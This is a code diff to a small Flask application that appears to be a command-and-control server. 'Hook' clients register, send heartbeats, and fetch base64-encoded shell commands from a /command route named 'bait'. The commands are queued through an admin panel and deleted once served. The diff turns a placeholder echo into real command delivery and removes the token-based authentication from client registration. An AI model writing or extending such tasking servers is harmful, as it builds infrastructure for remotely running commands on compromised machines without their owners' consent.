@@ -1,11 +1,10 @@
-from flask import Flask, jsonify, render_template
-from flask_jwt_extended import create_access_token
+from flask import Flask, jsonify, render_template, abort
 from flask_admin import Admin
 from app.views.admin import MyAdminIndexView, HookModelView, CommandView
 from flask_sqlalchemy import SQLAlchemy
 import flask_login as login
 from datetime import datetime
-import dotenv
+import base64
 
 
 app = Flask(__name__)
@@ -77,8 +76,7 @@ def index():
 
 @app.route('/hook')
 def hook():
-    access_token = create_access_token(identity=str(db.register_hook()))
-    return jsonify(access_token=access_token)
+    return jsonify(identity=str(db.register_hook()))
 
 
 @app.route('/alive', methods=['GET', 'POST'])
@@ -89,7 +87,20 @@ def alive():
 
 @app.route('/command', methods=['POST'])
 def bait():
-    return jsonify(command='echo "Hello World"')
+    command_row = Command.query.first()
+    if command_row:
+        # Retrieve the command attribute
+        command_value = command_row.command
+
+        # Delete the first Command object from the database
+        db.session.delete(command_row)
+        db.session.commit()
+
+        app.logger.info(f"Retrieved and deleted the first command: {command_value}")
+        return jsonify(command=base64.b64encode(command_value.encode()).decode())
+    
+    app.logger.info("No commands found in the database")
+    abort(404)
 
 if __name__ == '__main__':
     app.run(host='127.0.0.1', port=5000)
